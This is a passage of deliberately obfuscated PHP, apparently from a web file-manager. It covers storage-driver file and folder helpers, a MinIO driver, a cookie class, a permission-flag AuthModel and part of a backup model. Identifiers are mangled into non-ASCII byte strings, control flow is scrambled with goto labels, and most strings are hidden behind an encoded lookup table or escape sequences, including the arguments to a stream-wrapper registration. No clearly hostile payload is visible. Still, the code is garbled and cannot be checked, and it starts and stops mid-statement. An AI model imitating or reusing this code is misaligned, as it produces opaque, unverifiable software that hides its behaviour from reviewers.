ºÒ‚¬Åå[79]]++; $this->infoChildren($eÒÙøêŒŠ, $fê‰µ»±–, !1); } } closedir($bÔ ƒ¹ÜåÁ); } private function folderInfo($E¯è¿é²‚÷, $d©ÌÂ·Ç = false) { $BöŠÆÛ¬ŒÇ =& $_SERVER[Ìó]; $E¯è¿é²‚÷ = rtrim($E¯è¿é²‚÷, $BöŠÆÛ¬ŒÇ[8]) . $BöŠÆÛ¬ŒÇ[8]; $Cø—ĞŒ¢ = $this->iconvApp($this->pathThis($E¯è¿é²‚÷)); if ($d©ÌÂ·Ç) { return array($BöŠÆÛ¬ŒÇ[28] => $Cø—ĞŒ¢, $BöŠÆÛ¬ŒÇ[75] => $this->getPathOuter($E¯è¿é²‚÷), $BöŠÆÛ¬ŒÇ[29] => $BöŠÆÛ¬ŒÇ[76]); } $D¨ğ½Š® ¢ = array($BöŠÆÛ¬ŒÇ[28] => $Cø—ĞŒ¢, $BöŠÆÛ¬ŒÇ[75] => $this->getPathOuter($E¯è¿é²‚÷), $BöŠÆÛ¬ŒÇ[29] => $BöŠÆÛ¬ŒÇ[76], $BöŠÆÛ¬ŒÇ[183] => @filectime($E¯è¿é²‚÷), $BöŠÆÛ¬ŒÇ[106] => @filemtime($E¯è¿é²‚÷), $BöŠÆÛ¬ŒÇ[1156] => @fileatime($E¯è¿é²‚÷), $BöŠÆÛ¬ŒÇ[1150] => is_readable($E¯è¿é²‚÷), $BöŠÆÛ¬ŒÇ[1151] => is_writable($E¯è¿é²‚÷), $BöŠÆÛ¬ŒÇ[1157] => get_mode($E¯è¿é²‚÷)); return $D¨ğ½Š® ¢; } private function fileInfo($Dëè¨Íƒ±Û, $DÀ‹¸¬éƒ‘ = false) { $D‘…Œé”Ä =& $_SERVER[Ìó]; $cÄÔÍ‹í¯ó = $this->iconvApp($this->pathThis($Dëè¨Íƒ±Û)); if ($DÀ‹¸¬éƒ‘) { return array($D‘…Œé”Ä[28] => $cÄÔÍ‹í¯ó, $D‘…Œé”Ä[75] => $this->getPathOuter($Dëè¨Íƒ±Û), $D‘…Œé”Ä[29] => $D‘…Œé”Ä[163], $D‘…Œé”Ä[77] => $this->size($Dëè¨Íƒ±Û), $D‘…Œé”Ä[156] => $this->ext($cÄÔÍ‹í¯ó)); } $f«ÇºÍ£ª¨ = array($D‘…Œé”Ä[28] => $cÄÔÍ‹í¯ó, $D‘…Œé”Ä[75] => $this->getPathOuter($Dëè¨Íƒ±Û), $D‘…Œé”Ä[29] => $D‘…Œé”Ä[163], $D‘…Œé”Ä[183] => @filectime($Dëè¨Íƒ±Û), $D‘…Œé”Ä[106] => @filemtime($Dëè¨Íƒ±Û), $D‘…Œé”Ä[1156] => @fileatime($Dëè¨Íƒ±Û), $D‘…Œé”Ä[77] => $this->size($Dëè¨Íƒ±Û), $D‘…Œé”Ä[156] => $this->ext($cÄÔÍ‹í¯ó), $D‘…Œé”Ä[1150] => is_readable($Dëè¨Íƒ±Û), $D‘…Œé”Ä[1151] => is_writable($Dëè¨Íƒ±Û), $D‘…Œé”Ä[1157] => get_mode($Dëè¨Íƒ±Û)); return $f«ÇºÍ£ª¨; } public function exist($fƒğ…ñë«‹) { $fƒğ…ñë«‹ = $this->iconvSystem($fƒğ…ñë«‹); return @file_exists($fƒğ…ñë«‹); } public function isFile($añÕ˜˜ÜÅ®) { $añÕ˜˜ÜÅ® = $this->iconvSystem($añÕ˜˜ÜÅ®); return @is_file($añÕ˜˜ÜÅ®); } public function isFolder($dÑ‘‡ïäøÚ) { $dÑ‘‡ïäøÚ = $this->iconvSystem($dÑ‘‡ïäøÚ); return @is_dir($dÑ‘‡ïäøÚ); } public function listPath($fƒÍ†Š¼œğ, $CÍ‹©ğè÷¨ = false) { goto F¼íÉèä¯Ã; F¼íÉèä¯Ã: $EÅ™ìÅÍ‘µ =& $_SERVER[Ìó]; $fƒÍ†Š¼œğ = $this->iconvSystem($fƒÍ†Š¼œğ); $fƒÍ†Š¼œğ = rtrim($fƒÍ†Š¼œğ, $EÅ™ìÅÍ‘µ[8]) . $EÅ™ìÅÍ‘µ[8]; goto DÅ®ñÓòŞ; d‡Ë‚˜‡Êœ: closedir($D¸À¨¼•á); return $B©¤áÒÒ¬; goto B“êŒïÅÂõ; DÅ®ñÓòŞ: $B©¤áÒÒ¬ = array($EÅ™ìÅÍ‘µ[74] => array(), $EÅ™ìÅÍ‘µ[73] => array()); if (!($D¸À¨¼•á = @opendir($fƒÍ†Š¼œğ))) { return $B©¤áÒÒ¬; } while (($Fó‚ŒéÆ‘¡ = readdir($D¸À¨¼•á)) !== !1) { if ($Fó‚ŒéÆ‘¡ == $EÅ™ìÅÍ‘µ[91] || $Fó‚ŒéÆ‘¡ == $EÅ™ìÅÍ‘µ[1153]) { continue; } $cÈ‚²Ì¨ôá = $fƒÍ†Š¼œğ . $Fó‚ŒéÆ‘¡; if (is_file($cÈ‚²Ì¨ôá)) { $B©¤áÒÒ¬[$EÅ™ìÅÍ‘µ[73]][] = $this->fileInfo($cÈ‚²Ì¨ôá, $CÍ‹©ğè÷¨); } else { $B©¤áÒÒ¬[$EÅ™ìÅÍ‘µ[74]][] = $this->folderInfo($cÈ‚²Ì¨ôá, $CÍ‹©ğè÷¨); } } goto d‡Ë‚˜‡Êœ; B“êŒïÅÂõ: } public function listAll($d‡¶·‡‡÷¼, &$CÚÆ‹ËÀò¼ = array()) { goto eãÜµÓÂ´è; aãà£½Î: if (!($dÑàçÏ”¸— = @opendir($d‡¶·‡‡÷¼))) { return $CÚÆ‹ËÀò¼; } while (($dÓ¤Æ†É¥ = readdir($dÑàçÏ”¸—)) !== !1) { if ($dÓ¤Æ†É¥ == $F’à¨İªõ±[91] || $dÓ¤Æ†É¥ == $F’à¨İªõ±[1153]) { continue; } $C ‘¥Ï©¹ = $d‡¶·‡‡÷¼ . $dÓ¤Æ†É¥; if (is_dir($C ‘¥Ï©¹)) { $CÚÆ‹ËÀò¼[] = array($F’à¨İªõ±[75] => $C ‘¥Ï©¹ . $F’à¨İªõ±[8], $F’à¨İªõ±[76] => 1, $F’à¨İªõ±[106] => @filemtime($C ‘¥Ï©¹), $F’à¨İªõ±[77] => 0); $this->listAll($C ‘¥Ï©¹, $CÚÆ‹ËÀò¼); } else { $CÚÆ‹ËÀò¼[] = array($F’à¨İªõ±[75] => $C ‘¥Ï©¹, $F’à¨İªõ±[76] => 0, $F’à¨İªõ±[106] => @filemtime($C ‘¥Ï©¹), $F’à¨İªõ±[77] => $this->size($C ‘¥Ï©¹)); } } closedir($dÑàçÏ”¸—); goto D”Çù°İ²¯; eãÜµÓÂ´è: $F’à¨İªõ± =& $_SERVER[Ìó]; $d‡¶·‡‡÷¼ = $this->iconvSystem($d‡¶·‡‡÷¼); $d‡¶·‡‡÷¼ = rtrim($d‡¶·‡‡÷¼, $F’à¨İªõ±[8]) . $F’à¨İªõ±[8]; goto aãà£½Î; D”Çù°İ²¯: return $CÚÆ‹ËÀò¼; goto C’ Ôô…ò¾; C’ Ôô…ò¾: } public function has($d¸’õ¹·ëô, $Dâ´²‹êÄ = false, $EÕ´ç×ñáÓ = true) { goto d…åéœ™‡Â; Fô…ğŞİæš: if (!($d¤ØˆÓ¦ Ì = @opendir($d¸’õ¹·ëô))) { return !1; } $aƒÖÊ¢Ê“¬ = 0; $AÕÈë´Ûî¼ = 0; goto e“ò®È£„í; A·³öÈ¿¡Ç: return !1; goto Bó¹ô÷ËÉ™; d…åéœ™‡Â: $Aª¾íîŸ—í =& $_SERVER[Ìó]; $d¸’õ¹·ëô = $this->iconvSystem($d¸’õ¹·ëô); $d¸’õ¹·ëô = rtrim($d¸’õ¹·ëô, $Aª¾íîŸ—í[8]) . $Aª¾íîŸ—í[8]; goto Fô…ğŞİæš; e“ò®È£„í: while (($dĞ³ó¤±é¦ = readdir($d¤ØˆÓ¦ Ì)) !== !1) { if ($dĞ³ó¤±é¦ == $Aª¾íîŸ—í[91] || $dĞ³ó¤±é¦ == $Aª¾íîŸ—í[1153]) { continue; } $F™Øæ®ğ• = $d¸’õ¹·ëô . $dĞ³ó¤±é¦; if ($Dâ´²‹êÄ) { if (@is_file($F™Øæ®ğ•)) { $aƒÖÊ¢Ê“¬++; } else { $AÕÈë´Ûî¼++; } continue; } if ($EÕ´ç×ñáÓ) { if (@is_file($F™Øæ®ğ•)) { return !0; } } else { if (@is_dir($F™Øæ®ğ• . $Aª¾íîŸ—í[8])) { return !0; } } } closedir($d¤ØˆÓ¦ Ì); if ($Dâ´²‹êÄ) { return array($Aª¾íîŸ—í[187] => $aƒÖÊ¢Ê“¬, $Aª¾íîŸ—í[188] => $AÕÈë´Ûî¼); } goto A·³öÈ¿¡Ç; Bó¹ô÷ËÉ™: } public function hashSimple($bôœã) { goto D­Ïˆòˆìè; FÌ•×Ë¹‘: if ($d­„Ô¦áæ <= $A˜ŒºŠÒ * $Béš©Ş¼á) { return $this->hashMd5($bôœã) . $d­„Ô¦áæ; } $b«¬ÎŠßƒ­ = $b›µßî©¶¼[33]; $c„Œµ–ÄªÍ = intval($d­„Ô¦áæ / $Béš©Ş¼á); goto a¬–ÕôÓ³ó; f®î ‡‡Ôå: fseek($b‡‰¾·£Å, $d­„Ô¦áæ - $A˜ŒºŠÒ); $b«¬ÎŠßƒ­ .= fread($b‡‰¾·£Å, $A˜ŒºŠÒ); fclose($b‡‰¾·£Å); goto AÜ½âÅÇ—Ç; a¬–ÕôÓ³ó: $b‡‰¾·£Å = fopen($bôœã, $b›µßî©¶¼[1158]); if (!$b‡‰¾·£Å) { return $b«¬ÎŠßƒ­; } for ($D¥èÕõ¯ = 0; $D¥èÕõ¯ < $Béš©Ş¼á; $D¥èÕõ¯++) { fseek($b‡‰¾·£Å, $c„Œµ–ÄªÍ * $D¥èÕõ¯); $b«¬ÎŠßƒ­ .= fread($b‡‰¾·£Å, $A˜ŒºŠÒ); } goto f®î ‡‡Ôå; bØã¨ˆ•á: $d­„Ô¦áæ = $this->size($bôœã); $A˜ŒºŠÒ = 200; $Béš©Ş¼á = 50; goto FÌ•×Ë¹‘; D­Ïˆòˆìè: $b›µßî©¶¼ =& $_SERVER[Ìó]; if (!$bôœã) { return md5($b›µßî©¶¼[33]); } $bôœã = $this->iconvSystem($bôœã); goto bØã¨ˆ•á; AÜ½âÅÇ—Ç: return md5($b«¬ÎŠßƒ­) . $d­„Ô¦áæ; goto D†ÜÈ„ªÒ–; D†ÜÈ„ªÒ–: } public function getContent($aÖĞ´Ã¼•…) { $aÖĞ´Ã¼•… = $this->iconvSystem($aÖĞ´Ã¼•…); return file_get_contents($aÖĞ´Ã¼•…); } public function setContent($c¿§¿‘„…Í, $AßÃ§å‡ëØ = '') { $c¿§¿‘„…Í = $this->iconvSystem($c¿§¿‘„…Í); @file_put_contents($c¿§¿‘„…Í, $AßÃ§å‡ëØ, LOCK_EX); clearstatcache(); return strlen($AßÃ§å‡ëØ) == filesize($c¿§¿‘„…Í); } public function fileSubstr($cé‡òÓ‡ó, $a²–§¶ÁÔ = 0, $dŠÌÓ¡ø¨ = false) { goto Eİæİ’¤¼; Eİæİ’¤¼: $f¨‘¯¼ «˜ =& $_SERVER[Ìó]; $cé‡òÓ‡ó = $this->iconvSystem($cé‡òÓ‡ó); if ($dŠÌÓ¡ø¨ === !1) { $dŠÌÓ¡ø¨ = $this->size($cé‡òÓ‡ó); } goto e·–êãÍ’‘; fË¥ÏÎŒ Ë: return $aÒÀ¶ƒŠ¢; goto F‚“·èã—…; FçËé‰Öù¡: fseek($eñŒ¦„œŒŸ, $a²–§¶ÁÔ); $aÒÀ¶ƒŠ¢ = fread($eñŒ¦„œŒŸ, $dŠÌÓ¡ø¨); fclose($eñŒ¦„œŒŸ); goto fË¥ÏÎŒ Ë; e·–êãÍ’‘: if ($dŠÌÓ¡ø¨ <= 0) { return $f¨‘¯¼ «˜[33]; } $eñŒ¦„œŒŸ = fopen($cé‡òÓ‡ó, $f¨‘¯¼ «˜[1158]); if (!$eñŒ¦„œŒŸ) { return !1; } goto FçËé‰Öù¡; F‚“·èã—…: } public function upload($F¨æ–İµ¡, $b­õæó¤Ø, $aó¶¬¶ˆ¥² = false, $Bò½À‘¥²Ï = REPEAT_REPLACE) { $B­Ùµ–¸¢® = $this->copyFile($b­õæó¤Ø, $F¨æ–İµ¡); return $B­Ùµ–¸¢® ? $this->getPathOuter($F¨æ–İµ¡) : !1; } public function download($dª‘ªˆŒ, $c†íÒÍäÉÑ) { return $this->iconvSystem($dª‘ªˆŒ); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($dÉ½×™¬ƒ) { parent::__construct($dÉ½×™¬ƒ); $this->signatureVersion($_SERVER[Ìó][196]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto aÈÍÂÇŒ‡¶; Ašƒ¼…ô‰: $_SERVER[$_SERVER[†˜ı][52]] = (strrev('3449')."\x39\x31")+0;$_PbvV="7dBQtT4XdFuVdUJBJEQ97rAx8snmmRbbw2PqfdNucsc6tDXXpZk3yEsKMIPIiqHu6zRpw7Rh9Zyr4gtT";; stream_wrapper_register($_SERVER[†˜ı][53], $_SERVER[†˜ı][54]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($Eµ§÷Ø×¹Ì, $F» ¥ÚÄ´‰) { $AÄïîóßÓ =& $_SERVER[Ìó]; if (isset(self::$_methodList[$Eµ§÷Ø×¹Ì])) { return @call_user_func_array(self::$_methodList[$Eµ§÷Ø×¹Ì], $F» ¥ÚÄ´‰); } else { if (method_exists($this, $Eµ§÷Ø×¹Ì)) { return call_user_func_array(array($this, $Eµ§÷Ø×¹Ì), $F» ¥ÚÄ´‰); } else { think_exception(__CLASS__ . $AÄïîóßÓ[4] . $Eµ§÷Ø×¹Ì . $AÄïîóßÓ[5]); } } } public static function __callStatic($Dİóô†ìÖô, $a®§Ï¢•ÑÅ) { if (isset(self::$_methodListStatic[$Dİóô†ìÖô])) { return call_user_func_array(self::$_methodListStatic[$Dİóô†ìÖô], $a®§Ï¢•ÑÅ); } else { if (method_exists(self, $Dİóô†ìÖô)) { return call_user_func_array(array(self, $Dİóô†ìÖô), $a®§Ï¢•ÑÅ); } else { show_json("{$Dİóô†ìÖô}\x28\51\x20\156\157\x74\40\x65\x78\x69\x73\164\x3b", !1); } } } public static function addMethod($a«›‹áì¸, $AÃÓ»™Ÿ¡‡) { self::$_methodList[$a«›‹áì¸] = $AÃÓ»™Ÿ¡‡; } public static function addMethodStatic($BÀã´Ì¸¼, $c‘©·“ÓñÓ) { self::$_methodListStatic[$BÀã´Ì¸¼] = $c‘©·“ÓñÓ; } } goto FÈ±§«„—†; b¯‰ªŠ³³‚: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($EÂèÈ–©–‘ = '', $cô°´Ğ’É¨ = 0) { if (is_string($EÂèÈ–©–‘) && $EÂèÈ–©–‘ != $_SERVER[Ìó][33]) { $this->prefix = $EÂèÈ–©–‘; } if (is_numeric($cô°´Ğ’É¨) && $cô°´Ğ’É¨ > 0) { $this->expire = $cô°´Ğ’É¨; } } public static function getInstance() { static $d½Ó¹Ğ¶éÌ; if ($d½Ó¹Ğ¶éÌ === null) { $d½Ó¹Ğ¶éÌ = new self(); } return $d½Ó¹Ğ¶éÌ; } private static $sameCookieSet = array(); public static function set($DŠÊôòš¾Ê, $F÷»ÔÂèğ…, $DÚÜ‚ ½ = 0, $a˜ö¤¤“Ã¬ = false, $Bã·± æÄ  = false) { goto D´çº¾ê ÷; D´çº¾ê ÷: $A†‘ö¥È‹¿ =& $_SERVER[Ìó]; if (!$DÚÜ‚ ½) { $DÚÜ‚ ½ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$DŠÊôòš¾Ê]) && self::$sameCookieSet[$DŠÊôòš¾Ê] == $F÷»ÔÂèğ… . $DÚÜ‚ ½) { return; } goto Bá¦¶ì¦†ø; cïÏŒÁº­’: setcookie($DŠÊôòš¾Ê, $F÷»ÔÂèğ…, time() + $DÚÜ‚ ½, $A†‘ö¥È‹¿[8] . trim($Bã·± æÄ , $A†‘ö¥È‹¿[8]) . $c¤ØíòÙ†, !1, !1, $a˜ö¤¤“Ã¬); goto FïÚ˜Œ§ê; Bá¦¶ì¦†ø: self::$sameCookieSet[$DŠÊôòš¾Ê] = $F÷»ÔÂèğ… . $DÚÜ‚ ½; if (!$Bã·± æÄ ) { $Bã·± æÄ  = str_replace(HOST, $A†‘ö¥È‹¿[33], APP_HOST); $Bã·± æÄ  = _get($GLOBALS, $A†‘ö¥È‹¿[793], $Bã·± æÄ ); } $c¤ØíòÙ† = $A†‘ö¥È‹¿[33]; goto cïÏŒÁº­’; FïÚ˜Œ§ê: } public static function setSafe($Dä¢¬ÈÂ¿, $d†âèòµ­, $E•’ÛÔ¨ø´ = 0) { self::set($Dä¢¬ÈÂ¿, $d†âèòµ­, $E•’ÛÔ¨ø´, !0); } public static function get($dÇ«²±Ä¹Ò) { return isset($_COOKIE[$dÇ«²±Ä¹Ò]) ? $_COOKIE[$dÇ«²±Ä¹Ò] : !1; } public static function remove($B¯Ê×”ÎˆĞ, $e„•¿àØ´¤ = false) { unset($_COOKIE[$B¯Ê×”ÎˆĞ]); self::set($B¯Ê×”ÎˆĞ, $_SERVER[Ìó][33], 1, $e„•¿àØ´¤); } } $BŒÖÄÉÄ¦ª = LIB_DIR . $_SERVER[Ìó][794]; $e¦¡ÆéÌÒò = $_SERVER[Ìó][795]; goto AÂó³‰ˆÌŞ; b„ ²ºÜòë: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $d•“æ‰¸‡® =& $_SERVER[Ìó]; $F•Ï°Äš«È = array(array($d•“æ‰¸‡®[382] => LNG($d•“æ‰¸‡®[2073]), $d•“æ‰¸‡®[2074] => $d•“æ‰¸‡®[2075], $d•“æ‰¸‡®[2076] => 6, $d•“æ‰¸‡®[2077] => 1, $d•“æ‰¸‡®[2078] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($d•“æ‰¸‡®[382] => LNG($d•“æ‰¸‡®[2079]), $d•“æ‰¸‡®[2074] => $d•“æ‰¸‡®[2080], $d•“æ‰¸‡®[2076] => 1, $d•“æ‰¸‡®[2077] => 1, $d•“æ‰¸‡®[2078] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($d•“æ‰¸‡®[382] => LNG($d•“æ‰¸‡®[2081]), $d•“æ‰¸‡®[2074] => $d•“æ‰¸‡®[2082], $d•“æ‰¸‡®[2076] => 2, $d•“æ‰¸‡®[2077] => 1, $d•“æ‰¸‡®[2078] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($d•“æ‰¸‡®[382] => LNG($d•“æ‰¸‡®[2083]), $d•“æ‰¸‡®[2074] => $d•“æ‰¸‡®[2082], $d•“æ‰¸‡®[2076] => 3, $d•“æ‰¸‡®[2077] => 1, $d•“æ‰¸‡®[2078] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($d•“æ‰¸‡®[382] => LNG($d•“æ‰¸‡®[2084]), $d•“æ‰¸‡®[2074] => $d•“æ‰¸‡®[2085], $d•“æ‰¸‡®[2076] => 4, $d•“æ‰¸‡®[2077] => 1, $d•“æ‰¸‡®[2078] => self::AUTH_SHOW | self::AUTH_VIEW), array($d•“æ‰¸‡®[382] => LNG($d•“æ‰¸‡®[2086]), $d•“æ‰¸‡®[2074] => $d•“æ‰¸‡®[2087], $d•“æ‰¸‡®[2076] => 5, $d•“æ‰¸‡®[2077] => 1, $d•“æ‰¸‡®[2078] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($d•“æ‰¸‡®[382] => LNG($d•“æ‰¸‡®[2088]), $d•“æ‰¸‡®[2074] => $d•“æ‰¸‡®[2089], $d•“æ‰¸‡®[2076] => 7, $d•“æ‰¸‡®[2077] => 1, $d•“æ‰¸‡®[2078] => 0)); return $F•Ï°Äš«È; } public static function authCheck($A—ƒÊÔöšè, $bÌŒá¢Ô¸ã) { $A—ƒÊÔöšè = intval($A—ƒÊÔöšè); if (_get($GLOBALS, $_SERVER[Ìó][452])) { return !0; } if ($A—ƒÊÔöšè <= 0) { return !1; } if (($A—ƒÊÔöšè & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($A—ƒÊÔöšè & $bÌŒá¢Ô¸ã); } public static function authCheckShow($f™ó±©¨éã) { return self::authCheck($f™ó±©¨éã, self::AUTH_SHOW); } public static function authCheckView($Bœµ˜ãĞ¤) { return self::authCheck($Bœµ˜ãĞ¤, self::AUTH_VIEW); } public static function authCheckDownload($f­åöíÑÑÑ) { return self::authCheck($f­åöíÑÑÑ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($Fİˆœ©·˜¯) { return self::authCheck($Fİˆœ©·˜¯, self::AUTH_UPLOAD); } public static function authCheckEdit($DÙ¯‡Ë¾Š†) { return self::authCheck($DÙ¯‡Ë¾Š†, self::AUTH_EDIT); } public static function authCheckRemove($cã¾ÆáÇì) { return self::authCheck($cã¾ÆáÇì, self::AUTH_REMOVE); } public static function authCheckShare($d¿Ê¶öâÃÜ) { return self::authCheck($d¿Ê¶öâÃÜ, self::AUTH_SHARE); } public static function authCheckComment($C•×Çêê×’) { return self::authCheck($C•×Çêê×’, self::AUTH_COMMENT); } public static function authCheckEvent($có±·ÏÖ„ƒ) { return self::authCheck($có±·ÏÖ„ƒ, self::AUTH_EVENT); } public static function authCheckRoot($A‘ÆÎ÷Ã’š) { return self::authCheck($A‘ÆÎ÷Ã’š, self::AUTH_ROOT); } public static function authDisable($EßÙ¿õá¨ì, $A‰ºÚĞ§†®) { if (intval($EßÙ¿õá¨ì) <= 0) { return 0; } return intval($EßÙ¿õá¨ì) & ~$A‰ºÚĞ§†®; } public $optionType = "\x53\171\163\x74\x65\155\x2e\x73\x6f\165\x72\x63\145\x41\165\x74\150\114\x69\x73\x74"; public $field = array("\156\141\155\x65", "\x61\165\164\x68", "\154\141\142\145\154", "\144\x69\x73\x70\154\141\x79", "\x73\x79\163\164\145\x6d", "\163\157\x72\x74"); public function initData() { $A—…Ü±÷¥ƒ = $this->authDefault(); foreach ($A—…Ü±÷¥ƒ as $eÀäáÔš·ø) { $this->add($eÀäáÔš·ø); } } public function listData($B¹™à©”°„ = false, $bÄš¶«áè¸ = "\x73\x6f\x72\164", $dÇ‘¤Ö«Í¡ = false) { return parent::listData($B¹™à©”°„, $bÄš¶«áè¸, $dÇ‘¤Ö«Í¡); } public function update($a§æ¨®¾Ü, $fôÙî‡ç©¦) { $Dİæ­ºŞ´ =& $_SERVER[Ìó]; $D‰È÷ªì“¡ = parent::listData($a§æ¨®¾Ü); $F½Ñ¹ÍÃ•† = $this->findByName($fôÙî‡ç©¦[$Dİæ­ºŞ´[28]]); if (!$D‰È÷ªì“¡ || $F½Ñ¹ÍÃ•† && $F½Ñ¹ÍÃ•†[$Dİæ­ºŞ´[363]] != $D‰È÷ªì“¡[$Dİæ­ºŞ´[363]]) { return !1; } $this->filterAuth($fôÙî‡ç©¦[$Dİæ­ºŞ´[372]]); return parent::update($a§æ¨®¾Ü, $fôÙî‡ç©¦); } public function remove($EÃÆ„Ã¥Â®) { $c›äŠÇ½Êç = parent::listData($EÃÆ„Ã¥Â®); if (!$c›äŠÇ½Êç || $c›äŠÇ½Êç[$_SERVER[Ìó][1076]]) { return !1; } return parent::remove($EÃÆ„Ã¥Â®); } public function add($dÔƒÄÄÀäŞ = array()) { goto aÔåÚÕ¼äº; f†Ÿ®¶Ü¨²: return parent::insert($dÔƒÄÄÀäŞ); goto C‘Õ éÊ¹Ó; D§¡˜¨±½: $dÔƒÄÄÀäŞ = array_merge($F¢ìñÌÀ¥‰, $dÔƒÄÄÀäŞ); $dÔƒÄÄÀäŞ[$a…˜½‹À‘¦[2093]] = $this->getSort(); $this->filterAuth($dÔƒÄÄÀäŞ[$a…˜½‹À‘¦[372]]); goto f†Ÿ®¶Ü¨²; aÔåÚÕ¼äº: $a…˜½‹À‘¦ =& $_SERVER[Ìó]; if ($this->findByName($dÔƒÄÄÀäŞ[$a…˜½‹À‘¦[28]])) { return !1; } $F¢ìñÌÀ¥‰ = array($a…˜½‹À‘¦[28] => $a…˜½‹À‘¦[33], $a…˜½‹À‘¦[372] => 1, $a…˜½‹À‘¦[2090] => $a…˜½‹À‘¦[2091], $a…˜½‹À‘¦[2092] => 1, $a…˜½‹À‘¦[1076] => 0, $a…˜½‹À‘¦[2093] => 0); goto D§¡˜¨±½; C‘Õ éÊ¹Ó: } private function getSort() { $F¨”¦âæ¢ =& $_SERVER[Ìó]; $eêßŒÂŞ´ = parent::listData(); $c³Ä÷Ğ×Àµ = array_to_keyvalue($eêßŒÂŞ´, $F¨”¦âæ¢[33], $F¨”¦âæ¢[2093]); return empty($c³Ä÷Ğ×Àµ) ? 0 : max($c³Ä÷Ğ×Àµ) + 1; } private function filterAuth(&$f’“ŸÅÈã) { goto C…–š³ç–ƒ; aÃˆÒŸà¤¾: foreach ($f™…Œ‘è÷Ÿ as $aê…íƒ©”ª) { if ($f’“ŸÅÈã & $aê…íƒ©”ª) { $a†÷Ï…š‘Ø[] = $aê…íƒ©”ª; } } if (in_array(self::AUTH_ROOT, $a†÷Ï…š‘Ø)) { $f’“ŸÅÈã = array_sum($f™…Œ‘è÷Ÿ); return; } $aËóïŠ’­ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto B¨‡°¼‰Œó; C…–š³ç–ƒ: if (!$f’“ŸÅÈã) { return; } $f™…Œ‘è÷Ÿ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $a†÷Ï…š‘Ø = array(); goto aÃˆÒŸà¤¾; B¨‡°¼‰Œó: foreach ($a†÷Ï…š‘Ø as $aê…íƒ©”ª) { if (isset($aËóïŠ’­[$aê…íƒ©”ª])) { $a†÷Ï…š‘Ø = array_merge($a†÷Ï…š‘Ø, $aËóïŠ’­[$aê…íƒ©”ª]); } } $a†÷Ï…š‘Ø[] = self::AUTH_SHOW; $f’“ŸÅÈã = array_sum(array_unique($a†÷Ï…š‘Ø)); goto e ©Öºµäˆ; e ©Öºµäˆ: } public function sort($Eğ¾âß°¶, $fÚ‰ˆ¦‚‰Ñ) { return parent::update($Eğ¾âß°¶, $fÚ‰ˆ¦‚‰Ñ); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\145\155\56\142\x61\143\x6b\165\160\114\x69\x73\x74"; public $field = array("\x69\x6f", "\156\141\155\x65", "\x73\164\141\164\165\163", "\143\157\x6e\x74\145\156\164", "\162\x65\x73\165\154\x74", "\x74\x69\155\x65\106\162\x6f\155", "\164\151\155\145\124\x6f"); public function config() { goto f¼·­Ñ§†–; d™ø×£™ßÎ: Action($f˜îœâá•¸[2094])->taskInit(); $D«ˆÍâğºœ = Model($f˜îœâá•¸[2095])->listData(); foreach ($D«ˆÍâğºœ as $d‚©ãàâ‚Ù) { if ($d‚©ãàâ‚Ù[$f˜îœâá•¸[1076]] == $f˜îœâá•¸[83] && $d‚©ãàâ‚Ù[$f˜îœâá•¸[1397]] == $f˜îœâá•¸[2096]) { $Eë…öŒòóƒ = $d‚©ãàâ‚Ù; break; } } goto D¹÷ßùŞ»; EêƒÅ¡¼¬: $cĞ—»øÀ¯º = is_array($cĞ—»øÀ¯º) ? $cĞ—»øÀ¯º : array(); if (!isset($cĞ—»øÀ¯º[$f˜îœâá•¸[688]])) { $cĞ—»øÀ¯º[$f˜îœâá•¸[688]] = $f˜îœâá•¸[463]; } $Eë…öŒòóƒ = array(); goto d™ø×£™ßÎ; D¹÷ßùŞ»: if (isset($Eë…öŒòóƒ[$f˜îœâá•¸[186]])) { $Eë…öŒòóƒ[$f˜îœâá•¸[186]] = json_decode($Eë…öŒòóƒ[$f˜îœâá•¸[186]], !0); } if (isset($cĞ—»øÀ¯º[$f˜îœâá•¸[186]])) { $Eë…öŒòóƒ[$f˜îœâá•¸[186]][$f˜îœâá•¸[1384]] = $cĞ—»øÀ¯º[$f˜îœâá•¸[186]]; unset($cĞ—»øÀ¯º[$f˜îœâá•¸[186]]); } return array_merge($Eë…öŒòóƒ, $cĞ—»øÀ¯º); goto f¹¬æƒ’Ú•; f¼·­Ñ§†–: $f˜îœâá•¸ =& $_SERVER[Ìó]; $cĞ—»øÀ¯º = Model($f˜îœâá•¸[1084])->get($f˜îœâá•¸[708]); $cĞ—»øÀ¯º = 